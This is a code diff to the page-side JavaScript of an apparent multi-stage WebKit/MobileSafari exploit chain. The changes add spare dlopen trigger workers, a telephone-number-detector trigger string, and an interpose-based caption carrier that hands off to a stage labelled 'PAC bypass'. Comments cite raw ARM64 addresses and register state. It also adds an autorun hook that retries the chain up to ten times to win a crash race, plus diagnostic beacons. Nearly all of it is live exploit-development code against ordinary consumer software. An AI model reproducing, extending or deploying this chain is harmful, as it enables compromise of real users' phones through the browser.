@@ -368,29 +368,27 @@ poller.postMessage({ type: 'stage1' });
                     try { const cx = document.createElement('canvas').getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); } catch (e) { }   // CoreImage (http-safe, Safari 18+)
                 }
                 function startBroadcastPump() {
-                    if (__pumpTimer) return;
-                    log('[pump] broadcast pump ON');
-                    // typeof battery: most pump APIs are SECURE-CONTEXT-ONLY and are `undefined` over
-                    // plain http on a LAN origin -- log availability once so the run log says whether
-                    // the pump could even exist on this origin (run 014753 starved silently).
-                    log('[pump] typeof VD=' + (typeof VideoDecoder) + ' VE=' + (typeof VideoEncoder) +
-                        ' AD=' + (typeof AudioDecoder) + ' AE=' + (typeof AudioEncoder) +
-                        ' BD=' + (typeof BarcodeDetector) + ' SR=' + (typeof (window.SpeechRecognition || window.webkitSpeechRecognition)) +
-                        ' MMS=' + (typeof (window.ManagedMediaSource || window.MediaSource)) +
-                        ' md=' + (typeof (navigator.mediaDevices)) + ' PR=' + (typeof PaymentRequest) +
-                        ' AC=' + (typeof (window.AudioContext || window.webkitAudioContext)) +
-                        ' filter=' + (('filter' in (document.createElement('canvas').getContext('2d') || {}))));
-                    __pumpSyncWindow();
-                    __pumpFire();
-                    __pumpTimer = setInterval(__pumpFire, 2000);
-                    __pumpKill = setTimeout(() => stopBroadcastPump(), 30000);   // hard auto-stop
+                    // DISABLED (2026-07-22, memory-pressure reloads): §5 proved every JS-reachable
+                    // fresh-load path is exhausted on this device, so the pump produced ZERO useful
+                    // broadcasts while its activity (softlink battery + codec probes every 2s) drove
+                    // the WebContent's footprint into MobileSafari's clean-reload threshold at the
+                    // fire window -- the dominant attempt killer (0 jetsam/watchdog reports; the
+                    // reloads are browser-level memory pressure, §5s's pagehide-beacon class).
+                    // §5s's own trim list included "no post-fire pump re-enable" -- this enforces it.
+                    log('[pump] broadcast pump DISABLED (memory-pressure reload mitigation)');
+                    return;
                 }
                 function stopBroadcastPump() {
                     if (__pumpKill) { clearTimeout(__pumpKill); __pumpKill = null; }
                     if (__pumpTimer) { clearInterval(__pumpTimer); __pumpTimer = null; log('[pump] broadcast pump OFF'); }
                 }
                 async function prepare_dlopen_workers() {
-                    for (let i = 1; i <= 2; ++i) {
+                    // FOUR dlopen workers: [0]=worker1 park, [1]=worker2 park, [2]=SPARE for the
+                    // worker1 wake, [3]=SPARE for the worker2 wake. Each spare's close() runs the
+                    // AVSpeech gate on ITS thread for one wake fire -- a spare's bitmap is consumed
+                    // by its first close(), so a spent spare can never re-fire (stage6 needs a
+                    // fresh one, marker 0x44444444).
+                    for (let i = 1; i <= 4; ++i) {
                         const worker = new Worker(dlopen_worker_url);
                         dlopen_workers.push(worker);
                         await new Promise(r => {
@@ -409,6 +407,21 @@ poller.postMessage({ type: 'stage1' });
                 iframe.style.width = 0;
                 document.body.appendChild(iframe);
 
+                // TND GATE PROBE (2026-08-02, exploit-free): does THIS embedder enable parser-time
+                // telephone-number detection? settings().telephoneNumberParsingEnabled is
+                // status:embedder, default FALSE (UnifiedWebPreferences.yaml). If the probe number
+                // gets linkified into <a href="tel:..."> the gate is OPEN here; plain text = CLOSED
+                // (then the chain's armTelephoneGate forcing is what makes the fcall trigger work).
+                try {
+                    const pf = document.createElement('iframe');
+                    pf.style.display = 'none';
+                    document.body.appendChild(pf);
+                    pf.contentDocument.write('4089961010');
+                    const __h = (pf.contentDocument && pf.contentDocument.body) ? pf.contentDocument.body.innerHTML : '';
+                    log('[page] TND gate probe: ' + (/href="tel:/.test(__h) ? 'ENABLED (number linkified)' : 'CLOSED (plain text)') + ' | ' + __h.slice(0, 80));
+                    pf.remove();
+                } catch (e) { log('[page] TND gate probe ERR ' + e); }
+
                 worker.postMessage({
                     type: 'stage1',
                 });
@@ -416,13 +429,25 @@ poller.postMessage({ type: 'stage1' });
                 worker.onmessage = async function (event) {
                     const dataFromWorker = event.data;
                     log("Received back from worker:" + dataFromWorker);
-                    if (typeof dataFromWorker === 'string' && dataFromWorker.indexOf('fcall self-test PASSED') !== -1) { setStatus('fcall self-test PASSED'); }
+                    if (typeof dataFromWorker === 'string' && dataFromWorker.indexOf('fcall self-test PASSED') !== -1) {
+                        setStatus('fcall self-test PASSED');
+                        try { sessionStorage.setItem('autorun_done', '1'); } catch (e) { }   // disarm autorun: the ~13s gate-bomb teardown reload must NOT restart the chain
+                    }
                     if (dataFromWorker && typeof dataFromWorker === 'object') {
     switch (dataFromWorker.type) {
         case 'start_poll':
             if (pollerReady) poller.postMessage({ ...dataFromWorker, type: 'poll_locks' });
             else log('[page] start_poll dropped — poller not ready', 'fail');
             break;
+        case 'fire_spare': {
+            // SPARE fire worker: close its planted bitmap -> runs the AVSpeech gate on the spare's
+            // thread, so the chain never runs the gate (the fire-2 Bambi stall is retired). spareIdx
+            // selects the spare: 0 = dlopen_workers[2] (worker1's), 1 = dlopen_workers[3] (worker2's).
+            const spareIdx = (dataFromWorker && dataFromWorker.spareIdx) || 0;
+            log(`[page] fire_spare -> dlopen_workers[${2 + spareIdx}] (delivering close trigger)`);
+            dlopen_workers[2 + spareIdx].postMessage({ type: 'dlopen' });
+            break;
+        }
         case 'pump_start': startBroadcastPump(); break;
         case 'pump_stop': stopBroadcastPump(); break;
         case 'sign_pointers':
@@ -460,22 +485,33 @@ poller.postMessage({ type: 'stage1' });
                     cv.id = '__capv';
                     cv.muted = true; cv.playsInline = true;
                     cv.style.width = cv.style.height = '2px';
-                    cv.src = __b64uri(PUMP_H264, 'video/mp4');
+                    // NO cv.src, NO cv.play(): the caption battery (captionsStyleSheetOverride) fires
+                    // via the document's 0s caption-prefs timer + the forced reflow below, NOT via
+                    // playback. A PLAYING video re-invokes MACaptionAppearanceGetTextEdgeStyle (now
+                    // = IIOLoadCMPhotoSymbols via the interpose) per frame -> the dlopen+dlsym loop
+                    // pegs the main thread and starves the chain worker's event loop (the fcall-era
+                    // hang that wedged every caption fire, 2026-07-21).
                     const t = cv.addTextTrack('captions', 'English', 'en');
                     t.addCue(new VTTCue(0, 3600, 'wake'));
                     document.body.appendChild(cv);
                     t.mode = 'showing';
-                    cv.load();
-                    cv.play().catch(() => { });
+                    log('[page] carrier: track added, forcing reflow');
                 }
                 void cv.offsetHeight;   // force style/layout so caption prefs resolve now
+                log('[page] carrier: reflow RETURNED');
             } catch (e) { log('[page] caption carrier ERR ' + e, 'fail'); }
             await new Promise(r => setTimeout(r, 600));
+            log('[page] carrier: 600ms timer FIRED');
             // KILL the caption pipeline right after the resolution: the MACaption softlink global now
             // points to IIOLoadCMPhotoSymbols (via the interpose), so a playing video keeps calling it
             // -> re-running its full dlopen+dlsym loop on the main thread -> the main thread FREEZES
             // (the fcall-era hang). Stop the video + disable the track so it can't re-invoke it.
             try { const cv = document.getElementById('__capv'); if (cv) { cv.pause(); cv.removeAttribute('src'); cv.load(); const ts = cv.textTracks; for (const tr of ts) tr.mode = 'disabled'; cv.remove(); } log('[page] caption pipeline stopped post-resolution'); } catch (e) { }
+            worker.postMessage({ type: 'caption_done' });
+            // hand off to stage7 (PAC bypass): the caption carrier above resolved the gFunc globals
+            // via the interpose (IIOLoadCMPhotoSymbols re-dlsym), so the chain's stage7 self-test can
+            // read them. The string-switch "sign_pointers" -> stage7 path is unreachable here because
+            // the chain posts the OBJECT sign_pointers (this case) -- so send stage7 explicitly.
             worker.postMessage({ type: 'stage7' });
             break;
         case 'slow_fcall':
@@ -491,7 +527,15 @@ poller.postMessage({ type: 'stage1' });
             // (Security 0x1888d9b94) touches only x8/x9/x19/x20 and the ABI preserves x22=1 through
             // the called pc, so the tbz w22,#0 gate at 0x1a0ac25ac falls through to the walk as
             // required.
-            try { iframe.contentDocument.write('<span data-mime-type="text/latex">1</span>'); log('[page] iframe write RETURNED (fcall path completed on main thread)'); } catch (e) { log('[page] iframe write ERR ' + e, 'fail'); }
+            // Trigger text is a PHONE-LIKE number, not a bare "1": TelephoneNumberDetector::find has
+            // a pre-check (min length / pattern) that a single digit may not pass on some builds,
+            // so the scan never fires and the slot is never invoked (real-device: MARKER TEST sentinel
+            // survived). "5551234567" is a 10-digit NANP-shaped number; the data-mime-type wrapper
+            // still protects the out-params via the plain-insertTextNode path.
+            try { iframe.contentDocument.write('<span data-mime-type="text/latex">5551234567</span>'); log('[page] iframe write RETURNED (fcall path completed on main thread)'); } catch (e) { log('[page] iframe write ERR ' + e, 'fail'); }
+            // DOM PROBE (2026-08-02): did the detector scan run? If it did, the phone number gets
+            // wrapped in a tel: anchor. Plain text => the scan never fired (pre-check / context).
+            try { log('[page] iframe DOM: ' + (iframe.contentDocument && iframe.contentDocument.body ? iframe.contentDocument.body.innerHTML.slice(0, 160) : 'no body')); } catch (e) { log('[page] iframe DOM probe ERR ' + e); }
             worker.postMessage({ type: 'slow_fcall_done' });
             break;
         default:
@@ -554,6 +598,35 @@ break;
         }
 
         window.addEventListener("load", () => {
+            // DIAG (2026-07-21): pagehide beacon — a clean tab navigation FIRES this; a process
+            // crash/kill does NOT. Decides "Safari reloaded the tab" vs "WebContent died".
+            window.addEventListener('pagehide', () => {
+                try {
+                    const u = '/log?kind=log&msg=' + encodeURIComponent('[page] PAGEHIDE (clean navigation -- NOT a crash)') + '&t=';
+                    fetch(u, { keepalive: true }).catch(() => { });
+                    (new Image()).src = u;
+                } catch (e) { }
+            });
+            // TEST-AUTOMATION HOOK: autorun ONLY with ?autorun=1 (default loads stay manual, §5r cleanup respected).
+            // §5i AUTORUN-RETRY (2026-08-02): the mapredir stage6 fire has a ~57% once-gate completion
+            // race crash -> Safari clean-reloads the tab -> this hook fires again. Re-run (capped 10)
+            // so the per-run odds compound toward near-certain stage7; DISARM on 'fcall self-test
+            // PASSED' so teardown reloads (the ~13s latent gate bomb) don't restart the chain. Count +
+            // disarm live in sessionStorage (survives reloads within one Safari session).
+            if (/[?&]autorun=1/.test(location.search)) {
+                let __au = 0, __armed = true;
+                try { __au = parseInt(sessionStorage.getItem('autorun_count') || '0', 10); } catch (e) { }
+                try { __armed = sessionStorage.getItem('autorun_done') !== '1'; } catch (e) { }
+                if (__armed && __au < 10) {
+                    try { sessionStorage.setItem('autorun_count', String(__au + 1)); } catch (e) { }
+                    log(`[page] autorun=1 -- auto-starting run (attempt ${__au + 1})`);
+                    setTimeout(() => { init(); }, 800);
+                } else if (!__armed) {
+                    log('[page] autorun disarmed (a previous run reached fcall self-test PASSED)');
+                } else {
+                    log('[page] autorun capped (10 attempts this session) -- manual run required');
+                }
+            }
             //get slide
             // ---- Top bar: modal + title ----
             const overlay = document.getElementById("overlay");
